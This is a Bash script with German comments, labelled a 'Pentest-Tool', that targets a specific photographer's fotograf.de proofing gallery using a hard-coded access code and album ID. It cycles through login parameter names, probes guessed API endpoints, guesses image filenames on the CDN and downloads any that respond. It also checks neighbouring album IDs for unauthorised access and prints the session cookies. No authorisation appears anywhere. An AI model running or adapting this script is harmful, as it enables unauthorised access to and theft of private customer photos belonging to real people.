#!/bin/bash

# ============================================================
# fotograf.de / GotPhoto Proofing Gallery Extraction Script
# Target: merletronnierfotografie.fotograf.de
# Access Code: BL3G73V5
# ============================================================

BASE="https://merletronnierfotografie.fotograf.de"
ACCESS_CODE="BL3G73V5"
ALBUM_ID="159779470"
CDN_BASE="https://img3c.fotocdn.de/kthfkr6w"
COOKIE_FILE="/tmp/fotograf_cookies.txt"
OUTPUT_DIR="./fotograf_downloads"

rm -f "$COOKIE_FILE"
mkdir -p "$OUTPUT_DIR"

echo "============================================"
echo " fotograf.de Pentest-Tool"
echo " Target: $BASE"
echo " Album:  $ALBUM_ID"
echo " Code:   $ACCESS_CODE"
echo "============================================"
echo ""

# ============================================================
# PHASE 1: Cookie-Wall umgehen + Session initialisieren
# ============================================================
echo "[*] Phase 1: Cookie-Consent setzen + Session initialisieren"

# Cookie-Consent akzeptieren (first request)
curl -s -c "$COOKIE_FILE" -b "$COOKIE_FILE" \
  "$BASE/kunden/login" -o /dev/null

echo "[+] Cookies akzeptiert"
echo ""

# ============================================================
# PHASE 2: Login mit Access Code (verschiedene Parameter-Namen)
# ============================================================
echo "[*] Phase 2: Login mit Access Code $ACCESS_CODE"
echo ""

LOGIN_SUCCESS=0
LOGIN_REDIRECT=""

# Mögliche Parameter-Namen der Reihe nach testen
for PARAM in "access_code" "accesscode" "code" "accessCode" "access-code" "password" "ac" "login" "_access_code"; do

  echo "   -> Teste POST-Parameter: '$PARAM'"
  
  RESPONSE=$(curl -s -c "$COOKIE_FILE" -b "$COOKIE_FILE" \
    -X POST "$BASE/kunden/login" \
    -d "$PARAM=$ACCESS_CODE" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" \
    -L \
    -o /tmp/fotograf_login_response.html \
    -w "%{http_code} | %{url_effective} | %{redirect_url}" 2>/dev/null)
  
  HTTP_CODE=$(echo "$RESPONSE" | awk '{print $1}')
  FINAL_URL=$(echo "$RESPONSE" | awk -F' | ' '{print $2}')
  
  echo "      HTTP $HTTP_CODE | Final URL: $FINAL_URL"
  
  # Prüfen ob Login erfolgreich (nicht mehr auf Login-Seite)
  if ! grep -qi "Zugangscode" /tmp/fotograf_login_response.html 2>/dev/null; then
    if grep -qi "album\|galerie\|foto\|auswahl\|package\|produkt\|warenkorb" /tmp/fotograf_login_response.html 2>/dev/null; then
      echo "   [!!!] LOGIN ERFOLGREICH mit Parameter '$PARAM'!"
      LOGIN_SUCCESS=1
      LOGIN_PARAM="$PARAM"
      break
    fi
  fi
  
  # Auch auf Redirect prüfen (weg von /login)
  REDIR_URL=$(echo "$RESPONSE" | awk -F'|' '{print $3}')
  if [ -n "$REDIR_URL" ] && ! echo "$REDIR_URL" | grep -qi "login"; then
    echo "   [!!!] LOGIN ERFOLGREICH (Redirect zu $REDIR_URL)!"
    LOGIN_SUCCESS=1
    LOGIN_PARAM="$PARAM"
    break
  fi
done

if [ "$LOGIN_SUCCESS" -eq 0 ]; then
  echo ""
  echo "[!] Kein Login-Parameter hat funktioniert."
  echo "    Login-Seite zeigt immer noch das Formular."
  echo "    Mögliche Gründe:"
  echo "    - CSRF-Token erforderlich (in Page suchen)"
  echo "    - Zusätzlicher Hidden-Parameter nötig"
  echo "    - Access Code ist abgelaufen/deaktiviert"
  echo ""
  echo "    Extrahiere CSRF-Token aus Login-Seite..."
  
  # Nach CSRF-Token im HTML suchen
  grep -oP 'name="_token"[^>]*value="[^"]*"' /tmp/fotograf_login_response.html 2>/dev/null || \
  grep -oP 'name="csrf[^"]*"[^>]*value="[^"]*"' /tmp/fotograf_login_response.html 2>/dev/null || \
  grep -oP 'name="form_key[^"]*"[^>]*value="[^"]*"' /tmp/fotograf_login_response.html 2>/dev/null || \
  grep -oP 'name="authenticity_token[^"]*"[^>]*value="[^"]*"' /tmp/fotograf_login_response.html 2>/dev/null
  
  echo ""
  echo "    -> Extrahiere ALLE Input-Felder aus Login-Seite:"
  grep -oP '<input[^>]*name="[^"]*"[^>]*>' /tmp/fotograf_login_response.html 2>/dev/null || \
  echo "    (Keine Input-Felder gefunden - HTML wird gerendert)"
  
  exit 1
fi

echo ""

# ============================================================
# PHASE 3: Galerie-Seiten abrufen
# ============================================================
echo "[*] Phase 3: Galerie-Inhalte abrufen"
echo ""

declare -a URLS=(
  "$BASE/proofing/de-de/$ALBUM_ID/packages/"
  "$BASE/album/$ALBUM_ID/"
  "$BASE/album/$ALBUM_ID/page:1"
  "$BASE/gc/$ALBUM_ID"
  "$BASE/api/gallery/$ALBUM_ID"
  "$BASE/api/gallery/$ALBUM_ID/images"
  "$BASE/gallerylist/customer"
  "$BASE/albums/customer"
  "$BASE/order/index"
)

for URL in "${URLS[@]}"; do
  echo "   -> $URL"
  RESP=$(curl -s -b "$COOKIE_FILE" -o "/tmp/fotograf_page_$(echo $URL | md5sum | cut -c1-8).html" \
    -w "%{http_code}" "$URL" 2>/dev/null)
  echo "      HTTP $RESP"
done

echo ""

# ============================================================
# PHASE 4: Bild-URLs aus den Seiten extrahieren
# ============================================================
echo "[*] Phase 4: Bild-URLs extrahieren"
echo ""

# Aus allen gecrawlten Seiten nach Bild-URLs suchen
for f in /tmp/fotograf_page_*.html; do
  if [ -f "$f" ]; then
    echo "   -> Analysiere: $(basename $f)"
    
    # Suche nach img3c.fotocdn.de URLs
    echo "      CDN-Bild-URLs:"
    grep -oP 'https?://img3c\.fotocdn\.de/kthfkr6w[^"'\''<> ]+' "$f" 2>/dev/null | sort -u
    
    # Suche nach JSON-Blöcken mit Bilddaten
    echo "      JSON-Bilddaten:"
    grep -oP '\.jpg|\.jpeg|\.png|\.webp' "$f" 2>/dev/null | sort -u
    
    # Suche nach data-src / data-original Attributen
    echo "      Data-Src URLs:"
    grep -oP 'data-src="[^"]*"' "$f" 2>/dev/null
    
    # Suche nach JavaScript-Variablen mit Bild-Arrays
    echo "      JS-Arrays:"
    grep -oP '(var|let|const)\s+\w+\s*=\s*\[.*?\]' "$f" 2>/dev/null | head -5
    
    # Suche nach JSON.parse Blöcken
    echo "      JSON.parse:"
    grep -oP 'JSON\.parse\([^)]+\)' "$f" 2>/dev/null | head -5
    
    echo ""
  fi
done

# ============================================================
# PHASE 5: JSON-API-Endpunkte abfragen
# ============================================================
echo "[*] Phase 5: API-Endpunkte testen"
echo ""

declare -a API_URLS=(
  "$BASE/api/gallery/$ALBUM_ID"
  "$BASE/api/gallery/$ALBUM_ID/images"
  "$BASE/api/gallery/$ALBUM_ID/photos"
  "$BASE/api/v1/gallery/$ALBUM_ID"
  "$BASE/api/v1/images/$ALBUM_ID"
  "$BASE/api/images/$ALBUM_ID"
  "$BASE/rest/gallery/$ALBUM_ID"
  "$BASE/api/customer/albums"
  "$BASE/api/album/$ALBUM_ID"
  "$BASE/ajax/get_photos/$ALBUM_ID"
  "$BASE/ajax/get_photos?album=$ALBUM_ID"
)

for URL in "${API_URLS[@]}"; do
  JSON_RESP=$(curl -s -b "$COOKIE_FILE" "$URL" 2>/dev/null)
  HTTP_CODE=$(curl -s -b "$COOKIE_FILE" -o /dev/null -w "%{http_code}" "$URL" 2>/dev/null)
  
  if [ "$HTTP_CODE" != "404" ] && [ "$HTTP_CODE" != "500" ]; then
    echo "   [!] $URL -> HTTP $HTTP_CODE"
    echo "$JSON_RESP" | head -50
    echo ""
    
    # Nach Bild-URLs in JSON-Antwort suchen
    echo "$JSON_RESP" | grep -oP '"url"[^"]*"[^"]*"' 2>/dev/null
    echo "$JSON_RESP" | grep -oP '"src"[^"]*"[^"]*"' 2>/dev/null
    echo "$JSON_RESP" | grep -oP 'fotocdn\.de[^"'\'']+' 2>/dev/null
  fi
done

echo ""

# ============================================================
# PHASE 6: CDN-Brute-Force (gängige Dateinamen)
# ============================================================
echo "[*] Phase 6: CDN-Direktzugriff testen (gängige Muster)"
echo ""

declare -a PATTERNS=(
  "IMG_0001.jpg" "IMG_0002.jpg" "IMG_0003.jpg"
  "DSC_0001.jpg" "DSC_0002.jpg" "DSC_0003.jpg"
  "img_0001.jpg" "img_0002.jpg" "img_0003.jpg"
  "photo_1.jpg" "photo_2.jpg" "photo_3.jpg"
  "bild_1.jpg" "bild_2.jpg" "bild_3.jpg"
  "file_1.jpg" "file_2.jpg" "file_3.jpg"
  "${ALBUM_ID}_1.jpg" "${ALBUM_ID}_2.jpg" "${ALBUM_ID}_3.jpg"
  "image_1.jpg" "image_2.jpg" "image_3.jpg"
  "original_1.jpg" "preview_1.jpg"
  "bild01.jpg" "bild02.jpg" "bild03.jpg"
  "IMG_001.jpg" "IMG_002.jpg" "IMG_003.jpg"
)

for PATTERN in "${PATTERNS[@]}"; do
  HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" "$CDN_BASE/files/$PATTERN" 2>/dev/null)
  if [ "$HTTP_CODE" != "404" ]; then
    echo "   [!] ${CDN_BASE}/files/${PATTERN} -> HTTP $HTTP_CODE"
    if [ "$HTTP_CODE" = "200" ]; then
      echo "       DOWNLOAD: curl -o \"$OUTPUT_DIR/${PATTERN}\" \"$CDN_BASE/files/${PATTERN}\""
      curl -s -o "$OUTPUT_DIR/${PATTERN}" "$CDN_BASE/files/${PATTERN}" 2>/dev/null
      echo "       -> Datei gespeichert ($(stat -c%s "$OUTPUT_DIR/${PATTERN}" 2>/dev/null || echo '?') Bytes)"
    fi
  fi
done

echo ""

# ============================================================
# PHASE 7: IDOR-Test (andere Album-IDs)
# ============================================================
echo "[*] Phase 7: IDOR-Test - Andere Album-IDs enumerieren"
echo ""

for OFFSET in -3 -2 -1 1 2 3; do
  TEST_ID=$((ALBUM_ID + OFFSET))
  HTTP_CODE=$(curl -s -b "$COOKIE_FILE" -o /dev/null -w "%{http_code}" "$BASE/album/$TEST_ID/" 2>/dev/null)
  SIZE=$(curl -s -b "$COOKIE_FILE" -o /dev/null -w "%{size_download}" "$BASE/album/$TEST_ID/" 2>/dev/null)
  echo "   Album $TEST_ID -> HTTP $HTTP_CODE (${SIZE} Bytes)"
done

echo ""

# ============================================================
# PHASE 8: Session-Dump (Cookies + Session-Info)
# ============================================================
echo "[*] Phase 8: Session-Informationen"
echo ""
echo "   Cookies:"
cat "$COOKIE_FILE"
echo ""

# Prüfen ob wir eingeloggt sind (Session-Check)
echo "   Session-Check (Dashboard/Profil):"
for SESS_URL in "$BASE/customer/account" "$BASE/customer/index" "$BASE/account" "$BASE/me" "$BASE/profile"; do
  HTTP_CODE=$(curl -s -b "$COOKIE_FILE" -o /dev/null -w "%{http_code}" "$SESS_URL" 2>/dev/null)
  echo "      $SESS_URL -> $HTTP_CODE"
done

echo ""
echo "============================================"
echo " Script abgeschlossen."
echo " Ergebnisse in: $OUTPUT_DIR/"
echo "============================================"
